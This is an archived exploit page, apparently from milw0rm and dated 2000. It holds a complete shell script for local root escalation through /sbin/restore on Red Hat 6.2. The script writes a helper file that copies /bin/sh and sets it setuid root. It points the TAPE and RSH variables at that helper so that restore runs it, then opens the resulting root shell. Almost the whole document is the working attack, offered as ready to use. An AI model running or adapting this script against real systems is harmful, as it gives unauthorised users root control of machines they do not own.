<html><head><title>/sbin/restore exploit (rh6.2)</title></head><pre>#!/bin/sh
#
# /sbin/restore exploit for rh6.2
#
# I did not find this weakness my self, all i did was
# writing this script (and some more) to make it 
# automatic and easy to use.
#
# This exploit should work on all redhat 6.2 systems
# with /sbin/restore not &quot;fucked up&quot;. May work on other
# distros too, but only tested successfully on rh6.2.
#
# Make sure that the $USER variable is set! If you aren't
# sure, do a SET USER=&lt;your-login-name&gt; before you start
# the exploit!
#
# Please do NOT remove this header from the file.
#

echo &quot;###########################################&quot;
echo &quot;#     /sbin/restore exploit for rh6.2     #&quot;
echo &quot;#          this file by nawok '00         #&quot;
echo &quot;###########################################&quot;
echo &quot; &quot;
echo &quot;==&gt; EXPLOIT STARTED, Wait...&quot;
echo &quot;#!/bin/sh&quot; &gt;&gt; /home/$USER/execfile
echo &quot;cp /bin/sh /home/$USER/sh&quot; &gt;&gt; /home/$USER/execfile
echo &quot;chmod 4755 /home/$USER/sh&quot; &gt;&gt; /home/$USER/execfile
chmod 755 /home/$USER/execfile
export TAPE=restorer:restorer
export RSH=/home/$USER/execfile
touch /tmp/1
/sbin/restore -t /tmp/1
rm -f /home/$USER/execfile
echo &quot;==&gt; DONE! If everything went OK we will now enter rootshell...&quot;
echo &quot;==&gt; To check if its rooted, type 'whoami', or 'id'&quot; 
echo &quot;==&gt; B-Bye, you are on your own now.&quot;
/home/$USER/sh


# milw0rm.com [2000-11-16]</pre></html>